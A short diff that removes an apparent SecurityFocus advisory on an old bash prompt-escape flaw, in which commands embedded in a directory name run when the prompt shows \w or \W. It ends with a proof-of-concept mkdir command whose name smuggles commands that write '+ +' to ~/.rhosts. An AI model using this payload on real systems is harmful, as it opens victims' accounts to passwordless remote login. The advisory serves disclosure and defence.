@@ -1,9 +1,0 @@
-source: http://www.securityfocus.com/bid/119/info
-
-A vulnerability in bash may allow inadvertently running commands embedded in the path to the currently working directory.
-
-If an unsuspecting user enters a directory created by some malicious user with embedded commands, and their prompt (PS1) contains '\w' or '\W', and the prompt is displayed the commands will be executed. The vulnerability is in the parsing of the '\w' and '\W' escape codes.
-
-As the prompt must be displayed unattended shell scripts are not vulnerable.
-
-mkdir "\`echo -e \"echo + +> ~\57.rhosts\" > x; source x; rm -f \x\` "
